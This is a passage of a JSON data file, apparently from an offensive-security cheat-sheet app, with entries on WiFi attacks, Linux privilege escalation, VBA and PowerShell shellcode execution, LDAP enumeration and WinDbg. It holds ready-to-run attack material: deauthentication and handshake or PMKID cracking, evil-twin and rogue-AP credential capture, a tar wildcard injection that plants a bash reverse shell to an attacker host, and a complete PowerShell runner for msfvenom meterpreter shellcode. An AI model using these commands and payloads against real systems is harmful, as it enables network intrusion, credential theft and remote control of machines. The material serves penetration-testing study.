            "code": "\u274c No tab completion\n\u274c No command history (arrow keys)\n\u274c No text editors (vim, nano)\n\u274c Ctrl+C kills the shell\n\u274c No job control (Ctrl+Z)\n\u274c Weird terminal behavior\n\u274c No proper error messages"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Benefits of Stabilized Shells",
        "codes": [
          {
            "lang": "plaintext",
            "code": "\u2705 Tab completion works\n\u2705 Arrow keys for history\n\u2705 Can use vim, nano, less\n\u2705 Ctrl+C works properly\n\u2705 Job control (fg, bg)\n\u2705 Proper terminal size\n\u2705 Better overall experience"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "WiFi Pentesting",
    "title": "WiFi Pentesting",
    "tags": [],
    "steps": [
      {
        "title": "Reconnaissance",
        "substeps": [
          {
            "title": "Check Wireless Interfaces",
            "codes": [
              {
                "lang": "bash",
                "code": "iwconfig\nip link show\nairmon-ng"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Enable Monitor Mode",
            "codes": [
              {
                "lang": "bash",
                "code": "# Kill interfering processes\nairmon-ng check kill\n\n# Start monitor mode\nairmon-ng start <Interface>\n\n# Or manually\nip link set <Interface> down\niw <Interface> set monitor control\nip link set <Interface> up"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Scan for Networks",
            "codes": [
              {
                "lang": "bash",
                "code": "# Passive scan with airodump-ng\nairodump-ng <Interface>mon\n\n# Target specific channel\nairodump-ng -c <Channel> --bssid <BSSID> -w <OutputFile> <Interface>mon"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Disable Monitor Mode",
            "codes": [
              {
                "lang": "bash",
                "code": "airmon-ng stop <Interface>mon\nsystemctl start NetworkManager"
              }
            ],
            "optional": true,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "WPA/WPA2 Attacks",
        "substeps": [
          {
            "title": "Capture Handshake",
            "codes": [
              {
                "lang": "bash",
                "code": "# Start capture on target channel\nairodump-ng -c <Channel> --bssid <BSSID> -w <Capture> <Interface>mon\n\n# Deauth client to force reconnection (separate terminal)\naireplay-ng -0 5 -a <BSSID> -c <ClientMAC> <Interface>mon"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Crack with Aircrack-ng",
            "codes": [
              {
                "lang": "bash",
                "code": "aircrack-ng -w <Wordlist> -b <BSSID> <Capture>.cap"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Crack with Hashcat",
            "codes": [
              {
                "lang": "bash",
                "code": "# Convert cap to hashcat format\nhcxpcapngtool -o <Output>.22000 <Capture>.cap\n\n# Crack with hashcat\nhashcat -m 22000 <Output>.22000 <Wordlist>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "PMKID Attack (Clientless)",
            "codes": [
              {
                "lang": "bash",
                "code": "# Using hcxdumptool\nhcxdumptool -i <Interface>mon -o <Output>.pcapng --filterlist_ap=<BSSID> --filtermode=2 --enable_status=1\n\n# Convert and crack\nhcxpcapngtool -o <Output>.22000 <Output>.pcapng\nhashcat -m 22000 <Output>.22000 <Wordlist>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Capture PMKID from AP beacon without needing a client handshake using **hcxdumptool**.",
                "variant": "tip"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Capture 4-way handshake between AP and client, then crack offline.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Evil Twin Attack",
        "substeps": [
          {
            "title": "Create Fake AP with hostapd",
            "codes": [
              {
                "lang": "bash",
                "code": "cat > /tmp/hostapd.conf << EOF\ninterface=<Interface>\ndriver=nl80211\nssid=<TargetSSID>\nhw_mode=g\nchannel=<Channel>\nwmm_enabled=0\nmacaddr_acl=0\nauth_algs=1\nwpa=2\nwpa_passphrase=<Password>\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\nEOF\n\nhostapd /tmp/hostapd.conf"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Automated with Wifiphisher",
            "codes": [
              {
                "lang": "bash",
                "code": "wifiphisher -i <Interface> -e <TargetSSID>"
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Create fake AP to intercept traffic or capture credentials.",
            "variant": "danger"
          }
        ]
      },
      {
        "title": "WPA-Enterprise Attacks",
        "substeps": [
          {
            "title": "Rogue AP with hostapd-wpe",
            "codes": [
              {
                "lang": "bash",
                "code": "hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "EAPHammer",
            "codes": [
              {
                "lang": "bash",
                "code": "eaphammer -i <Interface> --auth wpa-eap --essid <TargetSSID> --creds"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Crack Captured MSCHAPv2",
            "codes": [
              {
                "lang": "bash",
                "code": "# hashcat for MSCHAPv2\nhashcat -m 5500 <Hash> <Wordlist>\n\n# asleap for LEAP\nasleap -C <Challenge> -R <Response> -W <Wordlist>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Target enterprise networks using EAP authentication.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "WEP Attacks",
        "substeps": [
          {
            "title": "WEP Cracking",
            "codes": [
              {
                "lang": "bash",
                "code": "# Capture IVs\nairodump-ng -c <Channel> --bssid <BSSID> -w <Capture> <Interface>mon\n\n# Generate traffic with ARP replay\naireplay-ng -3 -b <BSSID> -h <ClientMAC> <Interface>mon\n\n# Crack when enough IVs captured (~20,000+)\naircrack-ng <Capture>.cap"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": true,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "WEP is deprecated but still found in legacy environments.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Automated Tools",
        "substeps": [
          {
            "title": "Wifite",
            "codes": [
              {
                "lang": "bash",
                "code": "wifite --kill"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Bettercap",
            "codes": [
              {
                "lang": "bash",
                "code": "bettercap -iface <Interface>mon\n> wifi.recon on\n> wifi.show\n> wifi.deauth <BSSID>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": true,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "HackTricks WiFi",
        "url": "https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-wifi/"
      },
      {
        "text": "Aircrack-ng Docs",
        "url": "https://www.aircrack-ng.org/doku.php"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Enable monitor mode to capture wireless traffic and discover networks.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Linux Privilege Escalation",
    "title": "Wildcard Injection",
    "tags": [
      "Linux",
      "Post_Exploitation",
      "Privilege_Escalation"
    ],
    "steps": [
      {
        "title": "Tar Wildcard",
        "codes": [
          {
            "lang": "bash",
            "code": "echo 'bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1' > shell.sh\nchmod +x shell.sh\ntouch -- '--checkpoint=1'\ntouch -- '--checkpoint-action=exec=sh shell.sh'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "If script runs `tar cf archive.tar *` as root:"
          }
        ]
      },
      {
        "title": "Chown Wildcard",
        "codes": [
          {
            "lang": "bash",
            "code": "touch -- '--reference=/root/.ssh/authorized_keys'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "VBA Shellcode Execution",
    "title": "Win32 API Calls from VBA",
    "tags": [
      "Binary_Exploitation",
      "Code_Injection",
      "Else",
      "End",
      "Execution",
      "If",
      "Windows"
    ],
    "steps": [
      {
        "title": "API Declaration Syntax",
        "substeps": [
          {
            "title": "32-bit Declarations",
            "codes": [
              {
                "lang": "vba",
                "code": "Private Declare Function VirtualAlloc Lib \"kernel32\" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long\nPrivate Declare Function RtlMoveMemory Lib \"kernel32\" (ByVal dest As Long, ByRef src As Any, ByVal length As Long) As Long\nPrivate Declare Function CreateThread Lib \"kernel32\" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As Long"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "64-bit Declarations (PtrSafe)",
            "codes": [
              {
                "lang": "vba",
                "code": "Private Declare PtrSafe Function VirtualAlloc Lib \"kernel32\" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr\nPrivate Declare PtrSafe Function RtlMoveMemory Lib \"kernel32\" (ByVal dest As LongPtr, ByRef src As Any, ByVal length As Long) As LongPtr\nPrivate Declare PtrSafe Function CreateThread Lib \"kernel32\" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Architecture-Agnostic Declaration",
        "codes": [
          {
            "lang": "vba",
            "code": "#If VBA7 Then\n    Private Declare PtrSafe Function VirtualAlloc Lib \"kernel32\" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr\n    Private Declare PtrSafe Function RtlMoveMemory Lib \"kernel32\" (ByVal dest As LongPtr, ByRef src As Any, ByVal length As Long) As LongPtr\n    Private Declare PtrSafe Function CreateThread Lib \"kernel32\" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr\n#Else\n    Private Declare Function VirtualAlloc Lib \"kernel32\" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long\n    Private Declare Function RtlMoveMemory Lib \"kernel32\" (ByVal dest As Long, ByRef src As Any, ByVal length As Long) As Long\n    Private Declare Function CreateThread Lib \"kernel32\" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As Long\n#End If"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Use conditional compilation for 32/64-bit compatibility.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Microsoft Win32 API",
        "url": "https://learn.microsoft.com/en-us/windows/win32/apiindex/windows-api-list"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "VBA can call Win32 APIs directly using **Declare** statements. Enables shellcode execution in memory.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "PowerShell Shellcode Runner",
    "title": "Win32 APIs from PowerShell",
    "tags": [
      "Binary_Exploitation",
      "Code_Injection",
      "Defense_Evasion",
      "Execution",
      "PowerShell",
      "Windows"
    ],
    "steps": [
      {
        "title": "Add-Type Method (Touches Disk)",
        "codes": [
          {
            "lang": "powershell",
            "code": "$code = @\"\nusing System;\nusing System.Runtime.InteropServices;\n\npublic class Win32 {\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n\n    [DllImport(\"kernel32\")]\n    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n}\n\"@\n\nAdd-Type $code"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Compiles C# code at runtime. Creates temporary files on disk.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "PowerShell Shellcode Runner (Add-Type)",
        "substeps": [
          {
            "title": "Generate Shellcode",
            "codes": [
              {
                "lang": "bash",
                "code": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<AttackerIP> LPORT=<Port> -f ps1"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": true
          },
          {
            "title": "Complete Runner Script",
            "codes": [
              {
                "lang": "powershell",
                "code": "$code = @\"\nusing System;\nusing System.Runtime.InteropServices;\n\npublic class Win32 {\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n\n    [DllImport(\"kernel32\")]\n    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n}\n\"@\n\nAdd-Type $code\n\n# msfvenom shellcode\n[Byte[]] $buf = 0xfc,0x48,0x83,...\n\n# Allocate RWX memory\n$size = $buf.Length\n$addr = [Win32]::VirtualAlloc(0, $size, 0x3000, 0x40)\n\n# Copy shellcode\n[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)\n\n# Execute\n$thandle = [Win32]::CreateThread(0, 0, $addr, 0, 0, 0)\n[Win32]::WaitForSingleObject($thandle, [uint32]\"0xFFFFFFFF\")"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "P/Invoke Wiki",
        "url": "http://www.pinvoke.net/"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "PowerShell can call Win32 APIs through .NET P/Invoke or reflection. Enables in-memory shellcode execution.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "LDAP Enumeration",
    "title": "windapsearch - Automated LDAP Enumeration",
    "tags": [
      "Active_Directory",
      "Enumeration",
      "LDAP"
    ],
    "steps": [
      {
        "title": "Install windapsearch",
        "codes": [
          {
            "lang": "bash",
            "code": "git clone https://github.com/ropnop/windapsearch.git\ncd windapsearch\npip3 install -r requirements.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumerate Domain Users",
        "codes": [
          {
            "lang": "bash",
            "code": "python3 windapsearch.py -d <Domain> -u <Username> -p '<Password>' --dc-ip <DomainController> -U"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumerate Domain Computers",
        "codes": [
          {
            "lang": "bash",
            "code": "python3 windapsearch.py -d <Domain> -u <Username> -p '<Password>' --dc-ip <DomainController> -C"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumerate Domain Groups",
        "codes": [
          {
            "lang": "bash",
            "code": "python3 windapsearch.py -d <Domain> -u <Username> -p '<Password>' --dc-ip <DomainController> -G"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumerate Privileged Users",
        "codes": [
          {
            "lang": "bash",
            "code": "python3 windapsearch.py -d <Domain> -u <Username> -p '<Password>' --dc-ip <DomainController> --privileged-users"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumerate Domain Admins",
        "codes": [
          {
            "lang": "bash",
            "code": "python3 windapsearch.py -d <Domain> -u <Username> -p '<Password>' --dc-ip <DomainController> --da"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Full Enumeration (All Objects)",
        "codes": [
          {
            "lang": "bash",
            "code": "python3 windapsearch.py -d <Domain> -u <Username> -p '<Password>' --dc-ip <DomainController> --full"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Custom LDAP Query",
        "codes": [
          {
            "lang": "bash",
            "code": "python3 windapsearch.py -d <Domain> -u <Username> -p '<Password>' --dc-ip <DomainController> --custom \"(&(objectClass=user)(adminCount=1))\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "`windapsearch` is a Python tool that automates common LDAP queries.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "WinDbg Basics",
    "title": "WinDbg Debugger Basics",
    "tags": [
      "Binary_Exploitation",
      "Debugging",
      "Exploitation",
      "WinDbg",
      "Windows"
    ],
    "steps": [
      {
        "title": "Attaching to a Process",
        "codes": [
          {
            "lang": "text",
            "code": "File -> Attach to a Process (F6)\nSelect target process from list"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Attach WinDbg to a running process for debugging."
          }
        ]
      },
      {
        "title": "Launching a Process",
        "codes": [
          {
            "lang": "text",
            "code": "File -> Open Executable (Ctrl+E)\nBrowse to target executable"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Start a new process under debugger control."
          }
        ]
      },
      {
        "title": "WinDbg Command Window",
        "codes": [
          {
            "lang": "text",
            "code": "0:000> g                    ; Continue execution (go)\n0:000> p                    ; Step over\n0:000> t                    ; Step into (trace)\n0:000> q                    ; Quit debugger"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Execute debugger commands in the command window."
          }
        ]
      },
      {
        "title": "Configure Symbol Path",
        "codes": [
          {
            "lang": "text",
            "code": ".sympath srv*c:\\symbols*https://msdl.microsoft.com/download/symbols\n.symfix c:\\symbols\n.reload"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Set up symbols for better debugging information."
          }
        ]
      },
      {
        "title": "Verify Symbols Loaded",
        "codes": [
          {
            "lang": "text",
            "code": "lm                          ; List all modules\nlm m kernel32               ; List specific module\nx kernel32!*                ; List all symbols in module"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Check if symbols are properly loaded."
          }
        ]
      },
      {
        "title": "Save Workspace",
        "codes": [
          {
            "lang": "text",
            "code": "File -> Save Workspace"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Save your debugging session configuration."
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "Workspaces preserve window layouts, symbol paths, and breakpoints."
          }
        ]
      },
      {
        "title": "WinDbg Interface Elements [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Key windows in WinDbg:\n- **Command Window**: Enter debugger commands\n- **Disassembly Window**: View assembly code\n- **Registers Window**: View CPU register values\n- **Memory Window**: View raw memory contents\n- **Call Stack Window**: View function call history",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Open Additional Windows",
        "codes": [
          {
            "lang": "text",
            "code": "View -> Disassembly (Alt+7)\nView -> Registers (Alt+4)\nView -> Memory (Alt+5)\nView -> Call Stack (Alt+6)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Access specialized debugging views."
          }
        ]
      },
      {
        "title": "Command Output Format",
        "codes": [
          {
            "lang": "text",
            "code": "0:000>                      ; Thread 0, break 0\n0:001>                      ; Thread 1\neax=00000000 ebx=00000001   ; Register dump format"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "WinDbg commands follow consistent output patterns."
          }
        ]
      },
      {
        "title": "Help System",
        "codes": [
          {
            "lang": "text",
            "code": ".help                       ; List meta-commands\n?                           ; Expression evaluator help\n.hh <command>               ; Open help for specific command"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Access built-in command documentation."
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "WinDbg Documentation",
        "url": "https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "**WinDbg** is the primary debugger for Windows exploit development. Understanding its interface and basic commands is essential."
      }
    ]
  },
  {
    "category": "WinDbg Execution Control",
    "title": "WinDbg Execution Control",
    "tags": [
      "Binary_Exploitation",
      "Debugging",
      "Exploitation",
      "WinDbg",
      "Windows"
    ],
    "steps": [
      {
        "title": "Software Breakpoints",
        "codes": [
          {
            "lang": "text",
            "code": "bp <Address>                ; Set breakpoint at address\nbp kernel32!CreateFileA     ; Break on API function\nbp 0x00401000               ; Break at specific address\nbp mymodule!main            ; Break at function in module"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Set breakpoints to pause execution at specific addresses."
          }
        ]
      },
      {
        "title": "List Breakpoints",
        "codes": [
          {
            "lang": "text",
            "code": "bl                          ; List all breakpoints"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "View all currently set breakpoints."
          }
        ]
      },
      {
        "title": "Enable/Disable Breakpoints",
        "codes": [
          {
            "lang": "text",
            "code": "bd <Number>                 ; Disable breakpoint\nbe <Number>                 ; Enable breakpoint\nbd *                        ; Disable all breakpoints\nbe *                        ; Enable all breakpoints"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Toggle breakpoints without removing them."
          }
        ]
      },
      {
        "title": "Remove Breakpoints",
        "codes": [
          {
            "lang": "text",
            "code": "bc <Number>                 ; Clear specific breakpoint\nbc *                        ; Clear all breakpoints"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Delete breakpoints from the breakpoint list."
          }
        ]
      },
      {
        "title": "Unresolved Function Breakpoints",
        "codes": [
          {
            "lang": "text",
            "code": "bu <Module>!<Function>      ; Breakpoint unresolved\nbu mymodule!vulnerable_func"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Set breakpoints on functions in modules not yet loaded."
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "**bu** breakpoints persist across module loads and are set when the module loads.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Conditional Breakpoints",
        "codes": [
          {
            "lang": "text",
            "code": "bp <Address> \".if (eax == 0x41414141) {} .else {gc}\"\nbp kernel32!CreateFileA \".if (poi(esp+4) == 0x00401000) {} .else {gc}\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Break only when conditions are met."
          }
        ]
      },
      {
        "title": "Breakpoint Actions",
        "codes": [
          {
            "lang": "text",
            "code": "bp <Address> \"dd esp L4; g\"              ; Dump stack and continue\nbp <Address> \"r; .echo 'Hit!'; g\"        ; Show registers, print message, continue\nbp kernel32!recv \"dd esp L5; db poi(esp+8) L10; g\"   ; Dump recv params"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Execute commands when breakpoint hits."
          }
        ]
      },
      {
        "title": "Hardware Breakpoints",
        "codes": [
          {
            "lang": "text",
            "code": "ba e 1 <Address>            ; Break on execute (1 byte)\nba r 4 <Address>            ; Break on read (4 bytes)\nba w 4 <Address>            ; Break on write (4 bytes)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Use CPU debug registers for breakpoints (limited to 4)."
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "**e** = execute, **r** = read, **w** = write. Size can be 1, 2, or 4 bytes.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Hardware Breakpoint Examples",
        "codes": [
          {
            "lang": "text",
            "code": "ba w 4 0x00403000           ; Break when address is written\nba r 4 esp                  ; Break when ESP is read (unusual)\nba e 1 0x00401050           ; Break on execute (like bp but uses HW)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Common hardware breakpoint patterns."
          }
        ]
      },
      {
        "title": "List Hardware Breakpoints",
        "codes": [
          {
            "lang": "text",
            "code": "bl                          ; Shows both software and hardware BPs"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Hardware breakpoints appear in breakpoint list."
          }
        ]
      },
      {
        "title": "Stepping Through Code",
        "codes": [
          {
            "lang": "text",
            "code": "p                           ; Step over (execute call as single step)\nt                           ; Step into (trace into calls)\npt                          ; Step to next return\npc                          ; Step to next call\npa <Address>                ; Step to address"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Execute code one instruction at a time."
          }
        ]
      },
      {
        "title": "Continue Execution",
        "codes": [
          {
            "lang": "text",
            "code": "g                           ; Go (continue execution)\ngc                          ; Go from conditional breakpoint\ngh                          ; Go with exception handled\ngn                          ; Go with exception not handled\ngu                          ; Go up (execute until return)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Resume program execution."
          }
        ]
      },
      {
        "title": "Run to Address",
        "codes": [
          {
            "lang": "text",
            "code": "g <Address>                 ; Run until address\ng 0x00401050                ; Run until specific address\ng @$ra                      ; Run until return address"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Execute until reaching a specific address."
          }
        ]
      },
      {
        "title": "Exception Handling",
        "codes": [
          {
            "lang": "text",
            "code": "sxe <Exception>             ; Stop on first chance exception\nsxd <Exception>             ; Ignore first chance, stop on second\nsxi <Exception>             ; Ignore exception completely\nsxn <Exception>             ; Notify but don't stop"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Control how debugger handles exceptions."
          }
        ]
      },
      {
        "title": "Common Exception Settings",
        "codes": [
          {
            "lang": "text",
            "code": "sxe av                      ; Stop on access violation (first chance)\nsxd av                      ; Pass first chance AV to program\nsxe ld:<Module>             ; Stop when module loads"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Configure handling for common exceptions."
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "WinDbg Breakpoints",
        "url": "https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/setting-breakpoints"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Control program execution with breakpoints, stepping, and conditional breaks."
      }
    ]
  },
  {
    "category": "WinDbg Memory Operations",
    "title": "WinDbg Memory Operations",
    "tags": [
      "Binary_Exploitation",
      "Debugging",
      "Exploitation",
      "WinDbg",
      "Windows"
    ],
    "steps": [
      {
        "title": "Disassemble Memory",
        "codes": [
          {
            "lang": "text",
            "code": "u <Address>                 ; Unassemble from address\nu eip                       ; Unassemble from current instruction\nu eip L10                   ; Unassemble 10 instructions\nuf <Function>               ; Unassemble entire function"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "View assembly instructions at an address."
          }
        ]
      },
      {
        "title": "Display Memory",
        "codes": [
          {
            "lang": "text",
            "code": "db <Address>                ; Display bytes\ndw <Address>                ; Display words (2 bytes)\ndd <Address>                ; Display dwords (4 bytes)\ndq <Address>                ; Display qwords (8 bytes)\nda <Address>                ; Display ASCII string\ndu <Address>                ; Display Unicode string"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Read and display memory contents in various formats."
          }
        ]
      },
      {
        "title": "Display Memory with Length",
        "codes": [
          {
            "lang": "text",
